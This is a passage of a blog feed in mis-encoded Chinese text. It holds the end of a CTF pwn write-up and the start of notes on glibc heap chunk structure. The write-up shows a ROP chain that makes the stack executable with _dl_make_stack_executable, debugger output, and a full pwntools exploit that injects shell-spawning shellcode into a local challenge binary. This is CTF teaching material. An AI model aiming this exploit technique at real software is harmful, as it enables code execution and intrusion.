class="number">0x0000000000000007</span>      <span class="comment"># rwx</span></span><br><span class="line"><span class="number">0x7ffef00bbb28</span>:<span class="number">0x00000000004014c6</span>  <span class="comment"># pop rdi ; ret</span></span><br><span class="line"><span class="number">0x7ffef00bbb30</span>:<span class="number">0x00000000006c9fe0</span>      <span class="comment"># __stack_prot</span></span><br><span class="line"><span class="number">0x7ffef00bbb38</span>:<span class="number">0x000000000047a3b2</span>  <span class="comment"># mov [rdi], rsi</span></span><br><span class="line"><span class="number">0x7ffef00bbb40</span>:<span class="number">0x00000000004014c6</span>  <span class="comment"># pop rdi ; ret</span></span><br><span class="line"><span class="number">0x7ffef00bbb48</span>:<span class="number">0x00000000006c9f90</span>      <span class="comment"># __libc_stack_end</span></span><br><span class="line"><span class="number">0x7ffef00bbb50</span>:<span class="number">0x0000000000474730</span>      <span class="comment"># _dl_make_stack_executable</span></span><br><span class="line"><span class="number">0x7ffef00bbb58</span>:<span class="number">0x00000000004009e7</span>      <span class="comment"># vul</span></span><br></pre></td></tr></table></figure><p>è°ƒç”¨ mprotect å‰ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">     0x474754 &lt;_dl_make_stack_executable+36&gt; add    BYTE PTR [rbx+0x48], dl</span><br><span class="line">     0x474757 &lt;_dl_make_stack_executable+39&gt; mov    ebx, eax</span><br><span class="line"> â†’   0x474759 &lt;_dl_make_stack_executable+41&gt; call   0x43fd00 &lt;mprotect&gt;</span><br><span class="line">   â†³    0x43fd00 &lt;mprotect+0&gt;     mov    eax, 0xa</span><br><span class="line">        0x43fd05 &lt;mprotect+5&gt;     syscall </span><br><span class="line">        0x43fd07 &lt;mprotect+7&gt;     cmp    rax, 0xfffffffffffff001</span><br><span class="line"></span><br><span class="line">mprotect (</span><br><span class="line">   <span class="variable">$rdi</span> = 0x00007ffef00bb000 â†’ 0x0000000000000000,</span><br><span class="line">   <span class="variable">$rsi</span> = 0x0000000000001000,</span><br><span class="line">   <span class="variable">$rdx</span> = 0x0000000000000007</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">gefâ¤  vmmap </span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000000000400000 0x00000000004ca000 0x0000000000000000 r-x /home/firmy/pwn/pwn2/pwn2</span><br><span class="line">0x00000000006c9000 0x00000000006cc000 0x00000000000c9000 rw- /home/firmy/pwn/pwn2/pwn2</span><br><span class="line">0x00000000006cc000 0x00000000006ce000 0x0000000000000000 rw- </span><br><span class="line">0x00000000009b6000 0x00000000009d9000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007ffef009d000 0x00007ffef00be000 0x0000000000000000 rw- [stack]</span><br><span class="line">0x00007ffef0194000 0x00007ffef0197000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffef0197000 0x00007ffef0199000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ mprotect åï¼Œå¯ä»¥çœ‹åˆ° 0x00007ffef00bb000 åˆ° 0x00007ffef00bc000 çš„æ ˆå†…å­˜å·²ç»æ˜¯ rwx æƒé™äº†ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gefâ¤  vmmap </span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000000000400000 0x00000000004ca000 0x0000000000000000 r-x /home/firmy/pwn/pwn2/pwn2</span><br><span class="line">0x00000000006c9000 0x00000000006cc000 0x00000000000c9000 rw- /home/firmy/pwn/pwn2/pwn2</span><br><span class="line">0x00000000006cc000 0x00000000006ce000 0x0000000000000000 rw- </span><br><span class="line">0x00000000009b6000 0x00000000009d9000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007ffef009d000 0x00007ffef00bb000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffef00bb000 0x00007ffef00bc000 0x0000000000000000 rwx [stack]</span><br><span class="line">0x00007ffef00bc000 0x00007ffef00be000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffef0194000 0x00007ffef0197000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffef0197000 0x00007ffef0199000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç¨‹åºè·³åˆ° vul å‡½æ•°ï¼Œè¯»å…¥ shellcode åˆ°æ ˆä¸Šå¹¶æ‰§è¡Œï¼Œå³å¯è·å¾— shellã€‚exp å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vul = <span class="number">0x4009E7</span></span><br><span class="line">write = <span class="number">0x4009DD</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4014c6</span></span><br><span class="line">pop_rsi = <span class="number">0x4015e7</span></span><br><span class="line">pop_rdx = <span class="number">0x442626</span></span><br><span class="line">jmp_rsi = <span class="number">0x4a3313</span></span><br><span class="line">mov_rdi_esi = <span class="number">0x47a3b3</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&quot;A&quot;</span>*<span class="number">0x88</span></span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">7</span>) + p64(pop_rdi) + p64(elf.sym[<span class="string">&#x27;__stack_prot&#x27;</span>]) + p64(mov_rdi_esi)</span><br><span class="line">payload += p64(pop_rdi) + p64(elf.sym[<span class="string">&#x27;__libc_stack_end&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;_dl_make_stack_executable&#x27;</span>])</span><br><span class="line">payload += p64(vul)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;welcome~\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x88</span>, <span class="string">&quot;A&quot;</span>) + p64(jmp_rsi)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> PWNæŠ€å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å †ç›¸å…³æ•´ç†</title>
      <link href="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/"/>
      <url>/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="What-is-å †ï¼Ÿ"><a href="#What-is-å †ï¼Ÿ" class="headerlink" title="What is å †ï¼Ÿ"></a>What is å †ï¼Ÿ</h2><p>æ˜ç¡®ä¸€ä¸‹å †çš„æ¦‚å¿µï¼Œå †ä¸åŒäºæ ˆï¼Œå †æ˜¯åŠ¨æ€åˆ†é…çš„ï¼ˆç”±æ“ä½œç³»ç»Ÿå†…æ ¸æˆ–è€…å †ç®¡ç†å™¨ï¼‰ï¼Œåªæœ‰åœ¨ç¨‹åºä¸­éœ€è¦æ—¶æ‰ä¼šåˆ†é…ã€‚åœ¨ CTF çš„ pwn ç¨‹åºä¸­ï¼Œæ ˆæ˜¯ç¨‹åºåŠ è½½è¿›å†…å­˜åå°±ä¼šå‡ºç°ï¼Œè€Œå †æ˜¯ç”± mallocã€allocã€realloc å‡½æ•°åˆ†é…å†…å­˜åæ‰ä¼šå‡ºç°ã€‚</p><ul><li>windows å’Œ linux ä¸‹çš„å †åˆ†é…ã€ç®¡ç†æ–¹å¼éƒ½ä¸åŒï¼Œ<strong>è¿™é‡Œä¸»è¦è®²åˆ°çš„æ˜¯ CTF ä¸­å¸¸å‡ºç°çš„ linux ä¸‹çš„å †åˆ†é…çŸ¥è¯†</strong><br>å…ˆçœ‹çœ‹å †åœ¨è™šæ‹Ÿå†…å­˜ä¸­çš„ä½ç½®<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225175129.png" alt="Pasted image 20250225175129"></li><li><strong>å †çš„ç”Ÿé•¿æ–¹å‘æ˜¯ä»ä½åœ°å€å‘é«˜åœ°å€ç”Ÿé•¿çš„ï¼Œè€Œæ ˆæ˜¯ä»é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿çš„ã€‚</strong><br>å®é™…ä¸Šå †å¯ä»¥ç”³è¯·åˆ°çš„å†…å­˜ç©ºé—´æ¯”æ ˆè¦å¤§å¾ˆå¤šï¼Œåœ¨ linux çš„ 4G çš„è™šæ‹Ÿå†…å­˜ç©ºé—´é‡Œæœ€é«˜å¯ä»¥è¾¾åˆ° 2.9 G çš„ç©ºé—´<blockquote><p>å¯¹å †æ“ä½œçš„<strong>æ˜¯ç”±å †ç®¡ç†å™¨ï¼ˆptmalloc2ï¼‰æ¥å®ç°çš„ï¼Œè€Œä¸æ˜¯æ“ä½œç³»ç»Ÿå†…æ ¸</strong>ã€‚å› ä¸ºç¨‹åºæ¯æ¬¡ç”³è¯·æˆ–è€…é‡Šæ”¾å †æ—¶éƒ½éœ€è¦è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œç³»ç»Ÿè°ƒç”¨çš„å¼€é”€å·¨å¤§ï¼Œå½“é¢‘ç¹è¿›è¡Œå †æ“ä½œæ—¶ï¼Œå°±ä¼šä¸¥é‡å½±å“ç¨‹åºçš„æ€§èƒ½</p></blockquote></li></ul><p>ä¸‹é¢çš„åˆ†æéƒ½æ˜¯ä»¥ <strong>glibc åº“ä¸‹çš„ ptmalloc2 å †ç®¡ç†å™¨</strong>æ¥è®²è§£çš„ã€‚</p><h2 id="ä¸€ã€å †çš„åŸºæœ¬ç»“æ„"><a href="#ä¸€ã€å †çš„åŸºæœ¬ç»“æ„" class="headerlink" title="ä¸€ã€å †çš„åŸºæœ¬ç»“æ„"></a>ä¸€ã€å †çš„åŸºæœ¬ç»“æ„</h2><p>å…ˆç®€å•çš„ç”»ä¸€ä¸ªå›¾å§ï¼š<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225175239.png" alt="Pasted image 20250225175239"></p><h3 id="å †çš„ç»“æ„"><a href="#å †çš„ç»“æ„" class="headerlink" title="å †çš„ç»“æ„"></a>å †çš„ç»“æ„</h3><p><code>malloc_chunk</code>çš„ç»“æ„</p><h4 id="malloc-chunkç»“æ„"><a href="#malloc-chunkç»“æ„" class="headerlink" title="malloc_chunkç»“æ„"></a>malloc_chunkç»“æ„</h4><p>æ¯ä¸ªç¨‹åºåˆ†é…çš„å†…å­˜ï¼ˆè¿™é‡ŒæŒ‡çš„æ˜¯mallocå‡½æ•°ï¼‰åœ¨å†…éƒ¨è¢«ä¸€ä¸ªå«åšâ€<strong>å †å—</strong>â€çš„æ‰€æ›¿ä»£ã€‚<strong>ä¸€ä¸ªå †å—æ˜¯ç”±å…ƒæ•°æ®å’Œç¨‹åºè¿”å›çš„å†…å­˜ç»„æˆçš„ï¼ˆå®é™…ä¸Šå†…å­˜æ˜¯mallocçš„è¿”å›å€¼ï¼‰</strong>ã€‚æ‰€æœ‰çš„è¿™äº›å †å—éƒ½æ˜¯ä¿å­˜åœ¨å †ä¸Šï¼Œè¿™å—å†…å­˜åŒºåŸŸåœ¨ç”³è¯·æ–°çš„å†…å­˜æ—¶ä¼šä¸æ–­çš„æ‰©å¤§ã€‚åŒæ ·ï¼Œå½“ä¸€å®šæ•°é‡çš„å†…å­˜é‡Šæ”¾æ—¶ï¼Œå †å¯ä»¥æ”¶ç¼©ã€‚åœ¨glibcæºç ä¸­å®šä¹‰çš„å †å—å¦‚ä¸‹ï¼š<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>å‡è®¾å†…å­˜ä¸­æ²¡æœ‰å †å—é‡Šæ”¾ï¼Œæ–°åˆ†é…çš„å†…å­˜åŒºåŸŸç´§éšä¹‹å‰ç”³è¯·çš„å †å—åã€‚å› æ­¤å¦‚æœä¸€ä¸ªç¨‹åºä¾æ¬¡è°ƒç”¨malloc(256),malloc(512),ä»¥åŠmalloc(1024), å†…å­˜å¸ƒå±€å¦‚ä¸‹:<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225200003.png" alt="Pasted image 20250225200003"><br>åœ¨å †å—ä¹‹é—´çš„â€.â€æ˜¯è™šæ‹Ÿçš„è¾¹ç•Œï¼Œå®é™…å½“ä¸­ä»–ä»¬æ˜¯å½¼æ­¤ç›¸é‚»çš„ã€‚ä½ å¯èƒ½ä¼šé—®ï¼Œä¸ºä½•æˆ‘è¦åœ¨å¸ƒå±€å½“ä¸­åŒ…å«ä¸€ä¸ªâ€é¡¶å—â€å…ƒæ•°æ®ï¼ˆtop chunkï¼‰ã€‚<strong>é¡¶çº§å—è¡¨ç¤ºå †ä¸­å¯åˆ©ç”¨çš„å†…å­˜ï¼Œè€Œä¸”æ˜¯å”¯ä¸€çš„å¯ä»¥å¤§å°å¯ä»¥ç”Ÿé•¿çš„å †å—</strong>ã€‚å½“ç”³è¯·æ–°çš„å†…å­˜æ—¶ï¼Œé¡¶å—åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€ä¸ªéƒ¨åˆ†å˜æˆæ‰€ç”³è¯·çš„å †å—ï¼Œç¬¬äºŒä¸ªéƒ¨åˆ†å˜ä¸ºæ–°çš„é¡¶å—ï¼ˆå› æ­¤é¡¶å—å¤§å°å¯ä»¥æ”¶ç¼©ï¼‰ã€‚å¦‚æœé¡¶å—ä¸èƒ½å¤Ÿæ»¡è¶³ç”³è¯·çš„å†…å­˜åŒºåŸŸå¤§å°ï¼Œç¨‹åºå°±ä¼šè¦æ±‚æ“ä½œç³»ç»Ÿæ‰©å¤§é¡¶å—ï¼ˆè®©å †ç»§ç»­ç”Ÿé•¿ï¼‰ã€‚è¢«é‡Šæ”¾çš„chunkè¢«è®°å½•åœ¨é“¾è¡¨ä¸­ï¼ˆå¯èƒ½æ˜¯å¾ªç¯åŒå‘é“¾è¡¨ï¼Œä¹Ÿå¯èƒ½æ˜¯å•å‘é“¾è¡¨)ã€‚å…·ä½“ç»“æ„å¦‚ä¸‹<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225200210.png" alt="Pasted image 20250225200210"><br>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç‰©ç†ç›¸é‚»çš„ä¸¤ä¸ªç©ºé—²chunkä¼šè¢«åˆå¹¶ä¸ºä¸€ä¸ªchunkã€‚å †ç®¡ç†å™¨ä¼šé€šè¿‡prev_sizeå­—æ®µä»¥åŠsizeå­—æ®µåˆå¹¶ä¸¤ä¸ªç‰©ç†ç›¸é‚»çš„ç©ºé—²chunkå—ã€‚</p><h4 id="1-pre-sizeå­—æ®µ"><a href="#1-pre-sizeå­—æ®µ" class="headerlink" title="1. pre sizeå­—æ®µ"></a>1. pre sizeå­—æ®µ</h4><blockquote><p>å…¨ç§°previous size</p></blockquote><p>  å¦‚æœè¯¥ chunk çš„ç‰©ç†ç›¸é‚»çš„å‰ä¸€åœ°å€ chunkï¼ˆä¸¤ä¸ªæŒ‡é’ˆçš„åœ°å€å·®å€¼ä¸ºå‰ä¸€ chunk å¤§å°ï¼‰æ˜¯<strong>ç©ºé—²</strong>çš„è¯ï¼Œ<strong>é‚£è¯¥å­—æ®µè®°å½•çš„æ˜¯å‰ä¸€ä¸ª chunk çš„*</strong>å¤§å°<strong>* (</strong>åŒ…æ‹¬ chunk å¤´<strong>)ã€‚å¦åˆ™ï¼Œ</strong>è¯¥å­—æ®µå¯ä»¥ç”¨æ¥å­˜å‚¨ç‰©ç†ç›¸é‚»çš„å‰ä¸€ä¸ª chunk çš„æ•°æ®<strong>ã€‚è¿™é‡Œçš„å‰ä¸€ chunk æŒ‡çš„æ˜¯è¾ƒä½åœ°å€çš„ chunkã€‚</strong>å‰é¢ä¸€ä¸ªå †å—åœ¨ä½¿ç”¨æ—¶å¹¶ä¸”pre_sizeä¸ºå‚¨å­˜å‰é¢chunkçš„æ•°æ®æ—¶ï¼Œå®ƒçš„å€¼å§‹ç»ˆä¸º0**</p><h4 id="2-size-å­—æ®µ"><a href="#2-size-å­—æ®µ" class="headerlink" title="2. size å­—æ®µ"></a>2. size å­—æ®µ</h4><p><strong>ç”¨æ¥æŒ‡ç¤ºå½“å‰å †å—çš„å¤§å°çš„ï¼ˆå¤´éƒ¨åŠ ä¸Šï¼ˆpre_size+sizeï¼‰ +user data çš„å¤§å°ï¼‰</strong>ã€‚<br>å¤§å°å¿…é¡»æ˜¯ 2 <em> SIZE_SZ çš„æ•´æ•°å€ã€‚å¦‚æœç”³è¯·çš„å†…å­˜å¤§å°ä¸æ˜¯ 2 </em> SIZE_SZ çš„æ•´æ•°å€ï¼Œä¼šè¢«è½¬æ¢æ»¡è¶³å¤§å°çš„æœ€å°çš„ 2 <em> SIZE_SZ çš„å€æ•°ã€‚<br><strong>32 ä½ç³»ç»Ÿä¸­ï¼ŒSIZE_SZ æ˜¯ 4ï¼›</strong><br><strong>64 ä½ç³»ç»Ÿä¸­ï¼ŒSIZE_SZ æ˜¯ 8ã€‚</strong> </em>è¯¥å­—æ®µçš„ä½ä¸‰ä¸ªæ¯”ç‰¹ä½å¯¹ chunk çš„å¤§å°æ²¡æœ‰å½±å“<em>ï¼Œå®ƒä»¬ä»é«˜åˆ°ä½åˆ†åˆ«è¡¨ç¤º<br>ä½†æ˜¯è¿™ä¸ªå­—æ®µçš„æœ€å<em>*ä¸‰ä½</em></em>ç›¸å½“äºä¸‰ä¸ª flag ï¼Œè¿™ä¸‰ä½çš„ä½œç”¨åˆ†åˆ«æ˜¯ï¼š</p><ol><li><code>NON_MAIN_ARENA</code>ï¼Œè®°å½•å½“å‰ chunk æ˜¯å¦ä¸å±äº<strong>ä¸»åˆ†é…åŒºï¼ˆä¸»çº¿ç¨‹ï¼‰</strong>ï¼Œ1 è¡¨ç¤ºä¸å±äºï¼ˆæ˜¯éä¸»åˆ†é…åŒº/éä¸»çº¿ç¨‹ï¼‰ï¼Œ0 è¡¨ç¤ºå±äºã€‚</li><li><code>IS_MAPPED</code>ï¼Œè¡¨ç¤ºå½“å‰chunkæ˜¯ä»å“ªä¸ªå†…å­˜åŒºåŸŸè·å¾—çš„è™šæ‹Ÿå†…å­˜ã€‚ä¸º1è¡¨ç¤ºè¯¥chunkæ˜¯ä»<strong>mmap</strong>æ˜ å°„åŒºåŸŸåˆ†é…çš„ï¼Œå¦åˆ™æ˜¯ä»<strong>heap</strong>åŒºåŸŸåˆ†é…çš„</li><li><code>PREV_INUSE</code>ï¼Œè®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„ P ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ª chunk çš„ size çš„ P ä½ä¸º 0 æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ prev_size å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—² chunk ä¹‹é—´çš„åˆå¹¶ã€‚<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225180103.png" alt="Pasted image 20250225180103"><br>è¿™é‡Œé‡ç‚¹è®²è§£æœ€åä¸€ä½ï¼š<strong>ç”¨æ¥è®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ï¼Œè¢«åˆ†é…çš„è¯è¿™ä¸ªå­—æ®µçš„å€¼ä¸º 1</strong>ï¼Œæ‰€ä»¥ç»å¸¸ä¼šåœ¨å·²åˆ†é…çš„å †å—ä¸­çš„ size å­—æ®µä¸­å‘ç°å€¼æ¯”åŸæ¥å¤§ 1 ä¸ªå­—èŠ‚ã€‚<blockquote><p>æ‰€ä»¥å‰ä¸€ä¸ªå †å—çš„é‡Šæ”¾ä¸å¦éƒ½å’Œè¿™ä¸¤ä¸ªå­—æ®µï¼ˆpre_sizeã€sizeï¼‰çš„å€¼æœ‰å…³ï¼Œè¿™æ˜¯å› ä¸ºä¾¿äºå†…å­˜çš„é‡Šæ”¾æ“ä½œï¼ˆfreeï¼‰</p></blockquote></li></ol><h4 id="3-user-data"><a href="#3-user-data" class="headerlink" title="3. user data"></a>3. user data</h4><p>é¡¾åæ€ä¹‰å°±æ˜¯ç”¨æ¥å­˜æ”¾ç”¨æˆ·æ•°æ®çš„ã€‚<br>ä½¿ç”¨mallocå‡½æ•°åˆ†é…åˆ°çš„å†…å­˜çš„è¿”å›å€¼æŒ‡é’ˆæ˜¯<strong>æŒ‡å‘userdataï¼ˆç”¨æˆ·æ•°æ®åŒºï¼‰</strong><br>ä¾‹å¦‚åœ¨ 64 ä½ç¨‹åºä¸­ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><br>ç”³è¯·åˆ°çš„å †å—æ€»å¤§å°ä¸º<code>16 + 8 + 8 + 1 = 0x21(byte)</code></p><ol><li>ç¬¬ä¸€ä¸ª16å­—èŠ‚æ˜¯ç³»ç»Ÿæœ€å°åˆ†é…çš„å†…å­˜ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ å¦‚æœæƒ³è¦ç”³è¯·çš„å†…å­˜å°äºç³»ç»Ÿæœ€å°åˆ†é…çš„å†…å­˜çš„è¯ï¼Œå°±ä¼šæŒ‰ç…§æœ€å°çš„å†…å­˜æ¥åˆ†é…ã€‚</li></ol><ul><li>åœ¨64ä½ç³»ç»Ÿä¸­è¿™ä¸ªå€¼æ˜¯16ä¸ªå­—èŠ‚ï¼Œåœ¨32ä½ç³»ç»Ÿä¸­æ˜¯8ä¸ªå­—èŠ‚</li><li>ä¾‹å¦‚ï¼Œå¦‚æœä»£ç ä¸­æ˜¯malloc(0)çš„è¯ï¼Œå †ç®¡ç†å™¨ä¹Ÿä¼šåˆ†é…æœ€å°å†…å­˜ç©ºé—´ç»™ä½ </li></ul><ol><li>ç¬¬äºŒä¸ª8å­—èŠ‚æ˜¯pre sizeå­—æ®µçš„å¤§å°(32ä½çš„ä¸º4å­—èŠ‚)</li><li>ç¬¬ä¸‰ä¸ª8å­—èŠ‚ä¸º sizeå­—æ®µçš„å¤§å°ï¼ˆ32ä½çš„ä¸º4å­—èŠ‚)</li><li>æœ€åä¸€ä¸ª1å­—èŠ‚æ˜¯<strong>PREV_INUSEçš„å€¼ï¼Œåªæœ‰0æˆ–1ä¸¤ä¸ªå€¼</strong></li></ol><blockquote><p>æ•´ç†ä¸€ä¸‹ï¼š<strong>å †çš„åŸºæœ¬ç»“æ„åŒ…æ‹¬pre_sizeã€sizeã€userdata</strong><br><strong>sizeå­—æ®µåŒ…æ‹¬</strong>:å¤´éƒ¨(pre size+size)åŠ ä¸Š user data çš„å¤§å°<br>mallocå‡ºæœ€å°å¤§å°ä¸ºï¼šç³»ç»Ÿæœ€å°åˆ†é…å†…å­˜+pre_sizeå­—æ®µ+sizeå­—æ®µ+prev_inuse(æ­¤å¤„å­˜ç–‘ï¼‰</p></blockquote><h3 id="ç»“æ„å›¾"><a href="#ç»“æ„å›¾" class="headerlink" title="ç»“æ„å›¾"></a>ç»“æ„å›¾</h3><h4 id="ä½¿ç”¨ä¸­ï¼ˆåˆ†é…åï¼‰"><a href="#ä½¿ç”¨ä¸­ï¼ˆåˆ†é…åï¼‰" class="headerlink" title="ä½¿ç”¨ä¸­ï¼ˆåˆ†é…åï¼‰"></a>ä½¿ç”¨ä¸­ï¼ˆåˆ†é…åï¼‰</h4><p>å¦‚å›¾</p><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226142821.png" alt="Pasted image 20250226142821"></p><h4 id="ç©ºé—²ä¸­ï¼ˆé‡Šæ”¾åï¼‰"><a href="#ç©ºé—²ä¸­ï¼ˆé‡Šæ”¾åï¼‰" class="headerlink" title="ç©ºé—²ä¸­ï¼ˆé‡Šæ”¾åï¼‰"></a>ç©ºé—²ä¸­ï¼ˆé‡Šæ”¾åï¼‰</h4><p>å¦‚å›¾</p><ol><li>ç©ºé—²ä¸­çš„chunkä¸å­˜åœ¨MçŠ¶æ€ï¼Œåªæœ‰A|PçŠ¶æ€</li><li><strong>user dataå¤´éƒ¨</strong>è¢«åˆ†é…å‡ºä¸¤ä¸ªæˆå‘˜ï¼Œfdå’Œbk<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226153753.png" alt="Pasted image 20250226153753"><br><code>fd</code>ï¼Œ<code>bk</code>ã€‚ chunk å¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼Œä» fd å­—æ®µå¼€å§‹æ˜¯ç”¨æˆ·çš„æ•°æ®ã€‚chunk ç©ºé—²æ—¶ï¼Œä¼šè¢«æ·»åŠ åˆ°å¯¹åº”çš„ç©ºé—²ç®¡ç†é“¾è¡¨ä¸­ï¼Œå…¶å­—æ®µçš„å«ä¹‰å¦‚ä¸‹</li></ol><ul><li><code>fd</code> æŒ‡å‘å‰ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk çš„èµ·å§‹åœ°å€ï¼Œ32ä½å 4å­—èŠ‚ï¼Œ64ä½å 8å­—èŠ‚</li><li><code>bk</code> æŒ‡å‘åä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk çš„èµ·å§‹åœ°å€ï¼Œ32ä½å 4å­—èŠ‚ï¼Œ64ä½å 8å­—èŠ‚</li><li>é€šè¿‡ fd å’Œ bk å¯ä»¥å°†ç©ºé—²çš„ chunk å—åŠ å…¥åˆ°ç©ºé—²çš„ chunk å—é“¾è¡¨è¿›è¡Œç»Ÿä¸€ç®¡ç†</li></ul><blockquote><p>äº‹å®ä¸Šï¼Œé‡Šæ”¾åçš„<strong>large block</strong>ä¸­è¿˜å­˜åœ¨å¦å¤–ä¸¤ä¸ªæˆå‘˜ï¼š<strong>fd_nextsize</strong>å’Œ<strong>bk_nextsize</strong></p></blockquote><p><code>fd_nextsize</code>ï¼Œ <code>bk_nextsize</code>ï¼Œä¹Ÿæ˜¯åªæœ‰ chunk ç©ºé—²çš„æ—¶å€™æ‰ä½¿ç”¨ï¼Œä¸è¿‡å…¶ç”¨äºè¾ƒå¤§çš„ chunkï¼ˆlarge chunkï¼‰ã€‚</p><ul><li><strong>fd_nextsize</strong> æŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œ<strong>ä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆ</strong>ã€‚</li><li><strong>bk_nextsize</strong> æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œ<strong>ä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆ</strong>ã€‚  